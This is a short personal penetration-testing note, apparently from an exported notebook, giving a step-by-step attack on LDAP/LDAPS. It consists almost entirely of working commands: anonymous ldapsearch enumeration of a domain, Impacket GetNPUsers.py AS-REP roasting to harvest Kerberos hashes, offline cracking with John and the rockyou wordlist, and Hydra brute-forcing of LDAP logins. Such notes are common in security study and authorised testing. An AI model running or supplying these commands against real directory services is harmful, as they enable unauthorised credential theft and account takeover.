---
title: (389/636) LDAP/S
updated: 2023-11-29 02:27:46Z
created: 2023-11-29 02:27:08Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

## LDAP/S
1. Enumerate with anonymous credentials:
`ldapsearch -L -x -H ldap://<targetIP> -D '' -w '' -b "DC=domain,DC=com" > ldapresult.ldif`
`cat ldapresult.ldif| grep "Service Accounts"`
`cat ldapresult.ldif| grep sAMAccountName`
2. Run GetNPUsers.py to check for accounts that don't require Kerberos pre-authentication
`python3 /opt/impacket/GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast`
3. Crack passwords with John
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast`
4. Crack LDAP with Hydra
`hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f`